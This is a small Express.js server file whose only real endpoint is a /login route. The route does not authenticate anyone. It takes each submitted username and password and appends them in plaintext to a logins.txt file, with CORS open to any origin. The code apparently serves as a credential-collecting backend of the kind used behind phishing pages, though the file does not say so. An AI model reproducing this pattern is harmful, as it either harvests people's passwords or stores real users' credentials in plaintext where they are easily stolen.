require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require("cors");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 5000;

// Connect to MongoDB
mongoose.connect(process.env.MONGO_rishavhodoker, {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log("MongoDB Connected"))
  .catch(err => console.log(err));

app.use(cors());
app.use(bodyParser.json());

// Test Route (Fix "Cannot GET /" Error)
app.get("/", (req, res) => {
    res.send("Backend is running!");
});

// Login Route (Saves Data to a File)
app.post("/login", (req, res) => {
    const { username, password } = req.body;
    
    const logData = `Username: ${username}, Password: ${password}\n`;

    // Save login info to a text file
    fs.appendFile("logins.txt", logData, (err) => {
        if (err) {
            console.error("Error saving login:", err);
            return res.status(500).json({ message: "Failed to save login data" });
        }
        res.json({ message: "Login data saved successfully!" });
    });
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
